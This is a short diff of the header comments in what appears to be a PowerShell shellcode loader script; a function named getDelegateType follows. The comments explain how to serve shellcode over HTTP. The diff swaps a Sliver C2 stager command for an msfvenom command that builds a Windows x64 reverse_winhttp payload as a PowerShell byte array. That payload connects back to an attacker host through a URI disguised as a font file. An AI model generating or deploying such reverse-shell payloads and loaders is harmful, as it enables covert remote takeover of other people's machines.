@@ -6,8 +6,7 @@
 #   python3 -m http.server 80          # host /tmp/sc.bin
 #
 # Small shellcode (a stager) → paste the byte array inline instead:
-#   sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/stager.bin
-#   python3 sliver/sliver2arrays.py /tmp/stager.bin --ps1
+#   msfvenom -p windows/x64/custom/reverse_winhttp LHOST=<IP> LPORT=<PORT> LURI=/hello.woff -f ps1
 # =============================================================================
 
 function getDelegateType {
